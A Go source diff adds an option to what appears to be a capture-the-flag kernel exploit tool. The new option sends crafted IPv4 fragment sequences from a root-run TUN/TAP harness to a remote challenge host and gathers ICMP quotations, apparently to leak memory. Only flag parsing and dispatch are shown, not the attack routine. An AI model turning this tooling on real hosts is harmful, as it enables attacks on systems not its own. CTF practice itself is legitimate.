@@ -38,10 +38,12 @@ const (
 
 func main() {
 	if os.Geteuid() != 0 {
+		fmt.Fprintln(os.Stderr, "run as root")
 		os.Exit(1)
 	}
 	cfg := parseCfg()
 	if err := run(cfg); err != nil {
+		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
 	}
 }
@@ -55,6 +57,14 @@ type cfg struct {
 	count      int
 	page       bool
 	skipVerify bool
+	egress     bool
+	egressRest int
+	iface      string
+	dst        string
+	src        string
+	gateway    string
+	dstMAC     string
+	egressWait time.Duration
 }
 
 func parseCfg() cfg {
@@ -67,9 +77,18 @@ func parseCfg() cfg {
 	flag.IntVar(&c.count, "count", 1, "number of samples; batches buffer output until all samples finish")
 	flag.BoolVar(&c.page, "page", false, "force a page_frag head (TUNSETSNDBUF=INT_MAX, nonblocking write)")
 	flag.BoolVar(&c.skipVerify, "skip-verify", false, "skip the single-datagram header rewrite check")
+	flag.BoolVar(&c.egress, "egress", false, "send the fragment sequence through a real virtio-net interface")
+	flag.IntVar(&c.egressRest, "egress-rest", 4000, "payload after the short head in egress mode")
+	flag.StringVar(&c.iface, "iface", "eth0", "egress interface")
+	flag.StringVar(&c.dst, "dst", "chall.itsbengsky.id", "egress IPv4 destination or hostname")
+	flag.StringVar(&c.src, "src", "", "source IPv4 override (default: interface address)")
+	flag.StringVar(&c.gateway, "gateway", "", "next-hop IPv4 override (default: /proc/net/route)")
+	flag.StringVar(&c.dstMAC, "dst-mac", "", "next-hop MAC override (default: /proc/net/arp)")
+	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
 	flag.Parse()
 	c.tebarFill = byte(*fill)
 	c.capture = time.Duration(*captureMs) * time.Millisecond
+	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
 	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
 		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
 		os.Exit(1)
@@ -86,10 +105,21 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-count must be positive")
 		os.Exit(1)
 	}
+	if c.egressRest < 64 || c.head+c.egressRest > 65515 {
+		fmt.Fprintln(os.Stderr, "-egress-rest must produce an IPv4 datagram of 84..65535 bytes")
+		os.Exit(1)
+	}
+	if c.egressWait <= 0 {
+		fmt.Fprintln(os.Stderr, "-egress-wait-ms must be positive")
+		os.Exit(1)
+	}
 	return c
 }
 
 func run(c cfg) error {
+	if c.egress {
+		return runEgress(c)
+	}
 	tapName := getenv("PWN_TAP", "bengskytap")
 	capName := getenv("PWN_CAP", "bengskyv1")
 	if _, err := net.InterfaceByName(tapName); err != nil {
